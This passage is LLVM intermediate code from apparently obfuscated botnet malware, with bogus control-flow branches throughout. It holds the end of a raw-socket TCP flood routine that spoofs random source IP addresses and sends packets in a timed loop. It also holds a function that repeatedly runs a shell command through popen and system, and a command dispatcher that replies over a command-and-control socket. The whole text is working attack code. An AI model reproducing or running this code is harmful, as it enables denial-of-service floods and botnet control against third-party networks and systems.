  %272 = bitcast %union.anon.0* %271 to %struct.anon.1*
  %273 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %272, i32 0, i32 4
  %274 = load i16, i16* %273, align 4
  %275 = and i16 %274, -257
  %276 = or i16 %275, 256
  store i16 %276, i16* %273, align 4
  br label %355

; <label>:277:                                    ; preds = %265
  %278 = load i8*, i8** %23, align 8
  %279 = call i32 @strcmp(i8* %278, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.52, i32 0, i32 0)) #10
  %280 = icmp ne i32 %279, 0
  br i1 %280, label %305, label %281

; <label>:281:                                    ; preds = %277
  %282 = load i32, i32* @x.69
  %283 = load i32, i32* @y.70
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %281
  %290 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %291 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %290, i32 0, i32 0
  %292 = bitcast %union.anon.0* %291 to %struct.anon.1*
  %293 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %292, i32 0, i32 4
  %294 = load i16, i16* %293, align 4
  %295 = and i16 %294, -4097
  %296 = or i16 %295, 4096
  store i16 %296, i16* %293, align 4
  %297 = load i32, i32* @x.69
  %298 = load i32, i32* @y.70
  %299 = sub i32 %297, 1
  %300 = mul i32 %297, %299
  %301 = urem i32 %300, 2
  %302 = icmp eq i32 %301, 0
  %303 = icmp slt i32 %298, 10
  %304 = or i1 %302, %303
  br i1 %304, label %originalBBpart243, label %originalBB18alteredBB

originalBBpart243:                                ; preds = %originalBB18
  br label %354

; <label>:305:                                    ; preds = %277
  %306 = load i8*, i8** %23, align 8
  %307 = call i32 @strcmp(i8* %306, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.53, i32 0, i32 0)) #10
  %308 = icmp ne i32 %307, 0
  br i1 %308, label %333, label %309

; <label>:309:                                    ; preds = %305
  %310 = load i32, i32* @x.69
  %311 = load i32, i32* @y.70
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %309
  %318 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 0
  %320 = bitcast %union.anon.0* %319 to %struct.anon.1*
  %321 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %320, i32 0, i32 4
  %322 = load i16, i16* %321, align 4
  %323 = and i16 %322, -2049
  %324 = or i16 %323, 2048
  store i16 %324, i16* %321, align 4
  %325 = load i32, i32* @x.69
  %326 = load i32, i32* @y.70
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBBpart269, label %originalBB45alteredBB

originalBBpart269:                                ; preds = %originalBB45
  br label %353

; <label>:333:                                    ; preds = %305
  %334 = load i32, i32* @x.69
  %335 = load i32, i32* @y.70
  %336 = sub i32 %334, 1
  %337 = mul i32 %334, %336
  %338 = urem i32 %337, 2
  %339 = icmp eq i32 %338, 0
  %340 = icmp slt i32 %335, 10
  %341 = or i1 %339, %340
  br i1 %341, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %333
  %342 = load i32, i32* @mainCommSock, align 4
  %343 = load i8*, i8** %23, align 8
  %344 = call i32 (i32, i8*, ...) @sockprintf(i32 %342, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.54, i32 0, i32 0), i8* %343)
  %345 = load i32, i32* @x.69
  %346 = load i32, i32* @y.70
  %347 = sub i32 %345, 1
  %348 = mul i32 %345, %347
  %349 = urem i32 %348, 2
  %350 = icmp eq i32 %349, 0
  %351 = icmp slt i32 %346, 10
  %352 = or i1 %350, %351
  br i1 %352, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br label %353

; <label>:353:                                    ; preds = %originalBBpart273, %originalBBpart269
  br label %354

; <label>:354:                                    ; preds = %353, %originalBBpart243
  br label %355

; <label>:355:                                    ; preds = %354, %269
  %356 = load i32, i32* @x.69
  %357 = load i32, i32* @y.70
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %355
  %364 = load i32, i32* @x.69
  %365 = load i32, i32* @y.70
  %366 = sub i32 %364, 1
  %367 = mul i32 %364, %366
  %368 = urem i32 %367, 2
  %369 = icmp eq i32 %368, 0
  %370 = icmp slt i32 %365, 10
  %371 = or i1 %369, %370
  br i1 %371, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br label %372

; <label>:372:                                    ; preds = %originalBBpart277, %257
  br label %373

; <label>:373:                                    ; preds = %372, %245
  %374 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %374, i8** %23, align 8
  br label %222

; <label>:375:                                    ; preds = %222
  %376 = load i32, i32* @x.69
  %377 = load i32, i32* @y.70
  %378 = sub i32 %376, 1
  %379 = mul i32 %376, %378
  %380 = urem i32 %379, 2
  %381 = icmp eq i32 %380, 0
  %382 = icmp slt i32 %377, 10
  %383 = or i1 %381, %382
  br i1 %383, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %375
  %384 = load i32, i32* @x.69
  %385 = load i32, i32* @y.70
  %386 = sub i32 %384, 1
  %387 = mul i32 %384, %386
  %388 = urem i32 %387, 2
  %389 = icmp eq i32 %388, 0
  %390 = icmp slt i32 %385, 10
  %391 = or i1 %389, %390
  br i1 %391, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br label %392

; <label>:392:                                    ; preds = %originalBBpart281, %183
  %393 = call i32 @rand_cmwc()
  %394 = trunc i32 %393 to i16
  %395 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 0
  %397 = bitcast %union.anon.0* %396 to %struct.anon.1*
  %398 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %397, i32 0, i32 5
  store i16 %394, i16* %398, align 2
  %399 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %400 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %399, i32 0, i32 0
  %401 = bitcast %union.anon.0* %400 to %struct.anon.1*
  %402 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %401, i32 0, i32 6
  store i16 0, i16* %402, align 4
  %403 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %404 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %403, i32 0, i32 0
  %405 = bitcast %union.anon.0* %404 to %struct.anon.1*
  %406 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %405, i32 0, i32 7
  store i16 0, i16* %406, align 2
  %407 = load i32, i32* %9, align 4
  %408 = icmp eq i32 %407, 0
  br i1 %408, label %409, label %411

; <label>:409:                                    ; preds = %392
  %410 = call i32 @rand_cmwc()
  br label %416

; <label>:411:                                    ; preds = %392
  %412 = load i32, i32* %9, align 4
  %413 = trunc i32 %412 to i16
  %414 = call zeroext i16 @htons(i16 zeroext %413) #13
  %415 = zext i16 %414 to i32
  br label %416

; <label>:416:                                    ; preds = %411, %409
  %417 = phi i32 [ %410, %409 ], [ %415, %411 ]
  %418 = trunc i32 %417 to i16
  %419 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 0
  %421 = bitcast %union.anon.0* %420 to %struct.anon.1*
  %422 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %421, i32 0, i32 1
  store i16 %418, i16* %422, align 2
  %423 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %424 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %425 = call zeroext i16 @tcpcsum(%struct.iphdr* %423, %struct.tcphdr* %424)
  %426 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %427 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %426, i32 0, i32 0
  %428 = bitcast %union.anon.0* %427 to %struct.anon.1*
  %429 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %428, i32 0, i32 6
  store i16 %425, i16* %429, align 4
  %430 = bitcast i8* %141 to i16*
  %431 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %432 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %431, i32 0, i32 2
  %433 = load i16, i16* %432, align 2
  %434 = zext i16 %433 to i32
  %435 = call zeroext i16 @csum(i16* %430, i32 %434)
  %436 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %437 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %436, i32 0, i32 7
  store i16 %435, i16* %437, align 2
  %438 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %439 = load i32, i32* %10, align 4
  %440 = add nsw i32 %438, %439
  store i32 %440, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %441

; <label>:441:                                    ; preds = %494, %493, %416
  br label %442

; <label>:442:                                    ; preds = %441
  %443 = load i32, i32* %17, align 4
  %444 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %445 = call i64 @sendto(i32 %443, i8* %141, i64 %139, i32 0, %struct.sockaddr* %444, i32 16)
  %446 = load i32, i32* %19, align 4
  %447 = call i32 @getRandomIP(i32 %446)
  %448 = call i32 @htonl(i32 %447) #13
  %449 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %450 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %449, i32 0, i32 8
  store i32 %448, i32* %450, align 4
  %451 = call i32 @rand_cmwc()
  %452 = trunc i32 %451 to i16
  %453 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %454 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %453, i32 0, i32 3
  store i16 %452, i16* %454, align 4
  %455 = call i32 @rand_cmwc()
  %456 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %457 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %456, i32 0, i32 0
  %458 = bitcast %union.anon.0* %457 to %struct.anon.1*
  %459 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %458, i32 0, i32 2
  store i32 %455, i32* %459, align 4
  %460 = call i32 @rand_cmwc()
  %461 = trunc i32 %460 to i16
  %462 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %463 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %462, i32 0, i32 0
  %464 = bitcast %union.anon.0* %463 to %struct.anon.1*
  %465 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %464, i32 0, i32 0
  store i16 %461, i16* %465, align 4
  %466 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %467 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %466, i32 0, i32 0
  %468 = bitcast %union.anon.0* %467 to %struct.anon.1*
  %469 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %468, i32 0, i32 6
  store i16 0, i16* %469, align 4
  %470 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %471 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %472 = call zeroext i16 @tcpcsum(%struct.iphdr* %470, %struct.tcphdr* %471)
  %473 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %474 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %473, i32 0, i32 0
  %475 = bitcast %union.anon.0* %474 to %struct.anon.1*
  %476 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %475, i32 0, i32 6
  store i16 %472, i16* %476, align 4
  %477 = bitcast i8* %141 to i16*
  %478 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %479 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %478, i32 0, i32 2
  %480 = load i16, i16* %479, align 2
  %481 = zext i16 %480 to i32
  %482 = call zeroext i16 @csum(i16* %477, i32 %481)
  %483 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %484 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %483, i32 0, i32 7
  store i16 %482, i16* %484, align 2
  %485 = load i32, i32* %25, align 4
  %486 = load i32, i32* %15, align 4
  %487 = icmp eq i32 %485, %486
  br i1 %487, label %488, label %494

; <label>:488:                                    ; preds = %442
  %489 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %490 = load i32, i32* %24, align 4
  %491 = icmp sgt i32 %489, %490
  br i1 %491, label %492, label %493

; <label>:492:                                    ; preds = %488
  br label %497

; <label>:493:                                    ; preds = %488
  store i32 0, i32* %25, align 4
  br label %441

; <label>:494:                                    ; preds = %442
  %495 = load i32, i32* %25, align 4
  %496 = add i32 %495, 1
  store i32 %496, i32* %25, align 4
  br label %441

; <label>:497:                                    ; preds = %492
  %498 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %498)
  br label %499

; <label>:499:                                    ; preds = %497, %107, %99, %76
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %30
  %500 = call i32 @rand_cmwc()
  %501 = trunc i32 %500 to i16
  %502 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %501, i16* %502, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %50
  %503 = load i32, i32* %9, align 4
  %504 = trunc i32 %503 to i16
  %505 = call zeroext i16 @htons(i16 zeroext %504) #13
  %506 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %505, i16* %506, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %77
  %507 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %508 = getelementptr inbounds [8 x i8], [8 x i8]* %507, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %508, i8 0, i64 8, i32 4, i1 false)
  %509 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %509, i32* %17, align 4
  %510 = load i32, i32* %17, align 4
  %511 = icmp ne i32 %510, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %110
  %512 = load i32, i32* %11, align 4
  %513 = icmp eq i32 %512, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %225
  %514 = load i8*, i8** %23, align 8
  %515 = call i32 @strcmp(i8* %514, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.49, i32 0, i32 0)) #10
  %516 = icmp ne i32 %515, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %281
  %517 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %518 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %517, i32 0, i32 0
  %519 = bitcast %union.anon.0* %518 to %struct.anon.1*
  %520 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %519, i32 0, i32 4
  %521 = load i16, i16* %520, align 4
  %_ = sub i16 %521, -4097
  %gen = mul i16 %_, -4097
  %_19 = sub i16 0, %521
  %gen20 = add i16 %_19, -4097
  %_21 = shl i16 %521, -4097
  %_22 = sub i16 %521, -4097
  %gen23 = mul i16 %_22, -4097
  %_24 = sub i16 %521, -4097
  %gen25 = mul i16 %_24, -4097
  %_26 = shl i16 %521, -4097
  %_27 = shl i16 %521, -4097
  %_28 = shl i16 %521, -4097
  %_29 = sub i16 0, %521
  %gen30 = add i16 %_29, -4097
  %522 = and i16 %521, -4097
  %_31 = shl i16 %522, 4096
  %_32 = shl i16 %522, 4096
  %_33 = shl i16 %522, 4096
  %_34 = shl i16 %522, 4096
  %_35 = sub i16 %522, 4096
  %gen36 = mul i16 %_35, 4096
  %_37 = shl i16 %522, 4096
  %_38 = sub i16 0, %522
  %gen39 = add i16 %_38, 4096
  %_40 = sub i16 %522, 4096
  %gen41 = mul i16 %_40, 4096
  %523 = or i16 %522, 4096
  store i16 %523, i16* %520, align 4
  br label %originalBB18

originalBB45alteredBB:                            ; preds = %originalBB45, %309
  %524 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %525 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %524, i32 0, i32 0
  %526 = bitcast %union.anon.0* %525 to %struct.anon.1*
  %527 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %526, i32 0, i32 4
  %528 = load i16, i16* %527, align 4
  %_46 = shl i16 %528, -2049
  %_47 = shl i16 %528, -2049
  %_48 = sub i16 %528, -2049
  %gen49 = mul i16 %_48, -2049
  %_50 = sub i16 %528, -2049
  %gen51 = mul i16 %_50, -2049
  %_52 = sub i16 0, %528
  %gen53 = add i16 %_52, -2049
  %_54 = sub i16 %528, -2049
  %gen55 = mul i16 %_54, -2049
  %_56 = shl i16 %528, -2049
  %529 = and i16 %528, -2049
  %_57 = sub i16 %529, 2048
  %gen58 = mul i16 %_57, 2048
  %_59 = shl i16 %529, 2048
  %_60 = sub i16 %529, 2048
  %gen61 = mul i16 %_60, 2048
  %_62 = sub i16 0, %529
  %gen63 = add i16 %_62, 2048
  %_64 = sub i16 %529, 2048
  %gen65 = mul i16 %_64, 2048
  %_66 = shl i16 %529, 2048
  %_67 = shl i16 %529, 2048
  %530 = or i16 %529, 2048
  store i16 %530, i16* %527, align 4
  br label %originalBB45

originalBB71alteredBB:                            ; preds = %originalBB71, %333
  %531 = load i32, i32* @mainCommSock, align 4
  %532 = load i8*, i8** %23, align 8
  %533 = call i32 (i32, i8*, ...) @sockprintf(i32 %531, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.54, i32 0, i32 0), i8* %532)
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %355
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %375
  br label %originalBB79
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32) #0 {
  %3 = load i32, i32* @x.71
  %4 = load i32, i32* @y.72
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct._IO_FILE*, align 8
  %15 = alloca [80 x i8], align 16
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  %16 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %17 = load i32, i32* %12, align 4
  %18 = add nsw i32 %16, %17
  store i32 %18, i32* %13, align 4
  %19 = getelementptr inbounds [80 x i8], [80 x i8]* %15, i32 0, i32 0
  %20 = call i32 (i8*, i8*, ...) @sprintf(i8* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.55, i32 0, i32 0)) #2
  %21 = getelementptr inbounds [80 x i8], [80 x i8]* %15, i32 0, i32 0
  %22 = load i8*, i8** %11, align 8
  %23 = call i8* @strcat(i8* %21, i8* %22) #2
  %24 = getelementptr inbounds [80 x i8], [80 x i8]* %15, i32 0, i32 0
  %25 = call i8* @strcat(i8* %24, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.56, i32 0, i32 0)) #2
  %26 = getelementptr inbounds [80 x i8], [80 x i8]* %15, i32 0, i32 0
  %27 = call %struct._IO_FILE* @popen(i8* %26, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.57, i32 0, i32 0))
  store %struct._IO_FILE* %27, %struct._IO_FILE** %14, align 8
  %28 = load i32, i32* @x.71
  %29 = load i32, i32* @y.72
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %36

; <label>:36:                                     ; preds = %40, %originalBBpart2
  %37 = load i32, i32* %13, align 4
  %38 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %39 = icmp sgt i32 %37, %38
  br i1 %39, label %40, label %43

; <label>:40:                                     ; preds = %36
  %41 = getelementptr inbounds [80 x i8], [80 x i8]* %15, i32 0, i32 0
  %42 = call i32 @system(i8* %41)
  br label %36

; <label>:43:                                     ; preds = %36
  %44 = load i32, i32* @x.71
  %45 = load i32, i32* @y.72
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %43
  %52 = load i32, i32* @x.71
  %53 = load i32, i32* @y.72
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %60 = alloca i8*, align 8
  %61 = alloca i32, align 4
  %62 = alloca i32, align 4
  %63 = alloca %struct._IO_FILE*, align 8
  %64 = alloca [80 x i8], align 16
  store i8* %0, i8** %60, align 8
  store i32 %1, i32* %61, align 4
  %65 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %66 = load i32, i32* %61, align 4
  %67 = add nsw i32 %65, %66
  store i32 %67, i32* %62, align 4
  %68 = getelementptr inbounds [80 x i8], [80 x i8]* %64, i32 0, i32 0
  %69 = call i32 (i8*, i8*, ...) @sprintf(i8* %68, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.55, i32 0, i32 0)) #2
  %70 = getelementptr inbounds [80 x i8], [80 x i8]* %64, i32 0, i32 0
  %71 = load i8*, i8** %60, align 8
  %72 = call i8* @strcat(i8* %70, i8* %71) #2
  %73 = getelementptr inbounds [80 x i8], [80 x i8]* %64, i32 0, i32 0
  %74 = call i8* @strcat(i8* %73, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.56, i32 0, i32 0)) #2
  %75 = getelementptr inbounds [80 x i8], [80 x i8]* %64, i32 0, i32 0
  %76 = call %struct._IO_FILE* @popen(i8* %75, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.57, i32 0, i32 0))
  store %struct._IO_FILE* %76, %struct._IO_FILE** %63, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %43
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #4

declare %struct._IO_FILE* @popen(i8*, i8*) #3

declare i32 @system(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %27 = load i8**, i8*** %4, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @strcmp(i8* %29, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.58, i32 0, i32 0)) #10
  %31 = icmp ne i32 %30, 0
  br i1 %31, label %35, label %32

; <label>:32:                                     ; preds = %2
  %33 = load i32, i32* @mainCommSock, align 4
  %34 = call i32 (i32, i8*, ...) @sockprintf(i32 %33, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0))
  br label %980

; <label>:35:                                     ; preds = %2
  %36 = load i32, i32* @x.73
  %37 = load i32, i32* @y.74
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %35
  %44 = load i8**, i8*** %4, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 0
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @strcmp(i8* %46, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.60, i32 0, i32 0)) #10
  %48 = icmp ne i32 %47, 0
  %49 = load i32, i32* @x.73
  %50 = load i32, i32* @y.74
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %48, label %62, label %57

; <label>:57:                                     ; preds = %originalBBpart2
  %58 = load i32, i32* @mainCommSock, align 4
  %59 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %60 = call i8* @inet_ntoa(i32 %59) #2
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %58, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.61, i32 0, i32 0), i8* %60)
  br label %980

; <label>:62:                                     ; preds = %originalBBpart2
  %63 = load i8**, i8*** %4, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 0
  %65 = load i8*, i8** %64, align 8
  %66 = call i32 @strcmp(i8* %65, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.62, i32 0, i32 0)) #10
  %67 = icmp ne i32 %66, 0
  br i1 %67, label %980, label %68

; <label>:68:                                     ; preds = %62
  %69 = load i32, i32* %3, align 4
  %70 = icmp ne i32 %69, 2
  br i1 %70, label %71, label %90

; <label>:71:                                     ; preds = %68
  %72 = load i32, i32* @x.73
  %73 = load i32, i32* @y.74
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %71
  %80 = load i32, i32* @mainCommSock, align 4
  %81 = call i32 (i32, i8*, ...) @sockprintf(i32 %80, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.63, i32 0, i32 0))
  %82 = load i32, i32* @x.73
  %83 = load i32, i32* @y.74
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %980

; <label>:90:                                     ; preds = %68
  %91 = load i32, i32* @x.73
  %92 = load i32, i32* @y.74
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %90
  %99 = load i8**, i8*** %4, align 8
  %100 = getelementptr inbounds i8*, i8** %99, i64 1
  %101 = load i8*, i8** %100, align 8
  %102 = call i32 @strcmp(i8* %101, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i32 0, i32 0)) #10
  %103 = icmp ne i32 %102, 0
  %104 = load i32, i32* @x.73
  %105 = load i32, i32* @y.74
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBBpart28, label %originalBB6alteredBB

